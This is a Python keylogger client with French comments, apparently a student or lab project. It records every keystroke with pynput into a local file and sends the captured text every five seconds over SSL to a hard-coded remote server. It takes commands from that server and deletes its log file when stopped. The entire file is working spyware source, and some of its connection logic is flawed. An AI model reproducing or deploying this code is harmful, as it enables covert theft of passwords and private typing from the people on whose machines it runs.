import socket
import ssl
import time
import pathlib
from pynput import keyboard
import os



def read_data_from_file(file_path):
    with open(file_path, 'r') as file:
        data = file.read()
    return data


def add_one_char(char):
    with open('keylogger.txt', "a") as f:
        f.write(char)


def del_one_char():
    with open('keylogger.txt', 'rb+') as f:
        f.seek(0,2)
        size=f.tell()
        f.truncate(size-1)


def record_key(key):

    if str(key) == "Key.enter":
        add_one_char("\n")

    elif str(key) == "Key.space":
        add_one_char(" ")

    elif str(key) == "Key.backspace":
        del_one_char()

    elif hasattr(key, 'char'):
        add_one_char(key.char)


def stop_client(conn, socket, listener, filepath):

    # arrêt du listener
    listener.stop()

    # arrêt de la connexion
    conn.close()
    socket.close()

    # suppression du fichier (sans erreur si le fichier n'existe pas)
    pathlib.Path.unlink(filepath, missing_ok=True)

    exit(0)


def create_ssl_conn(host, port):

    cert = """-----BEGIN CERTIFICATE-----
MIIDZzCCAk8CFHu2VLkM/4HJ6LlASP/BaLcFNUoRMA0GCSqGSIb3DQEBCwUAMHAx
CzAJBgNVBAYTAkZSMQ8wDQYDVQQIDAZFU1NPTkUxDjAMBgNVBAcMBVBBUklTMQ0w
CwYDVQQKDARFU0dJMQswCQYDVQQLDAJJVDEkMCIGCSqGSIb3DQEJARYVeWFuaXMu
enJpYmlAZ21haWwuY29tMB4XDTIzMTIzMTEzNDAxMloXDTI0MDEzMDEzNDAxMlow
cDELMAkGA1UEBhMCRlIxDzANBgNVBAgMBkVTU09ORTEOMAwGA1UEBwwFUEFSSVMx
DTALBgNVBAoMBEVTR0kxCzAJBgNVBAsMAklUMSQwIgYJKoZIhvcNAQkBFhV5YW5p
cy56cmliaUBnbWFpbC5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCyKOpKCF109xqdqaW4MW48N7tL99SrlVnqFciVI1yw+cfYE6ytB8xoDgzqVQIi
GjegtoZ7BeMgNeE4alT+dKbnrQtzNwufs6LsPPxOxNPlcN4C1XW7t3gaKZ8pMhYd
Ej89z4y9Ck64Ju6c2TViC9QXigjPLdQGXmr36wvRRwWQYP0lhc7nPE3ehhXS4vRu
CD8UHmt+BQwiTKDPzEgwuTtwNmPtqX2jnX4krHGwjK3D+pYFJEM9sm6OI0Iwo78N
qJuttgxlfDTnONDLHlswq1tXPF2IrUwyu0GddnLNlovUi7VDQq+/BCTyOcTtaH7D
Lh6xKk/bCbXM5Blq2TiPrWPlAgMBAAEwDQYJKoZIhvcNAQELBQADggEBACiPQR2x
jdu/+/D8WQ9oCVSQCbJjQ2Vyp6HcZgPPZLxvtt+6Jsie2MGbfuT/aoz9uG4v1+ks
ts4edpRq6vCrhIAYMv1SLC9WPHqprTs0OZu7gcd4z2xzP8Er9Wea5+baM08SQ+MA
cKyPom1wzBRoYqxOuy9TeKgaeQXu2Ik08OkGZQUbXVN46UGn6rwmEZ7n4E0A1RDW
uPsnwd5HRbwKvErxSPYwQTptO31yLjRG+7kBtEDTQw3fxlFRyApuDUuABFfFIuT3
u2GHuvJoscjMnd4xHcpdbl2Xkzcf4zfZsgU/9PTHkAGxjyuGU/bRK7bBsANtZrml
ZQz6+amlYyEwdjo=
-----END CERTIFICATE-----"""

    with open('./cert.pem', 'w') as f:
        f.write(cert)

    # création du socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(3.0)

    # création du contexte ssl (avec le certificat du serveur)
    context_ssl = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context_ssl.load_verify_locations(cafile="./ssl2/certificate.pem")


    # Connexion au serveur (avec implémentation du chiffrement)
    conn_ssl = context_ssl.wrap_socket(client_socket, server_hostname='localhost')

    retries = 0
    disconnected = True

    t1 = time.time()

    while disconnected:
        t2 = time.time()

        if t2 - t1 > 2:
            t1 = t2

            try:
                conn_ssl.connect((host, port))
                return conn_ssl, client_socket

            except Exception as e:
                print("Erreur lors de la connexion")

                retries = retries + 1
                
                # si le nombre maximum de tentative de connexion a été atteint
                if retries > 3:
                    print("Le serveur est injoingnable !")

                    # arrêt du client
                    stop_client(conn_ssl, client_socket, listener, file_path)



# config du listener pour récupérer les touches
listener = keyboard.Listener(on_press=record_key)
listener.start()


host = '172.16.120.1'
port = 8442

file_path = 'keylogger.txt'  

#Vérifiction si le fichier keylogger.txt existe
if not os.path.exists(file_path):
    with open(file_path, 'w') as f:
        f.write("Data collected :\n")

# création du socket et de la connexion
conn, client_socket = create_ssl_conn(host, port)


running = True
t1 = time.time()


while running:
    try:
        t2 = time.time()

        if t2 - t1 > 5:
            # update de t1
            t1 = t2

            # envoyer les données au serveur
            keyboard_data = read_data_from_file(file_path)

            conn.send(keyboard_data.encode('utf-8'))

            # récupération du code de retour
            code = conn.recv(1024).decode("utf-8")

            if code == "OK":
                print("code : OK")

            elif code == "STOP":
                print("code : STOP")
                running = False

            else:
                print("code : ERROR")
                raise ssl.SSLEOFError



    except ssl.SSLEOFError:
        
        retries = 0
        disconnected = True

        t1 = time.time()

        while disconnected:
            t2 = time.time()

            if t2 - t1 > 2:
                t1 = t2

                new_conn, new_client_socket = create_ssl_conn(host, port)
                
                # si la connexion n'est pas possible avec le serveur
                if new_conn == "error":
                    retries = retries + 1

                # si la connexion a été rétablie
                else:
                    disconnected = False
                    conn = new_conn
                    client_socket = new_client_socket
            
            # si le nombre maximum de tentative de connexion a été atteint
            if retries > 3:
                print("Le serveur est injoingnable !")

                # arrêt du client
                stop_client(conn, client_socket, listener, file_path)

    except Exception as e:
        print(e)
        

# arrêt du client
stop_client(conn, client_socket, listener, file_path)
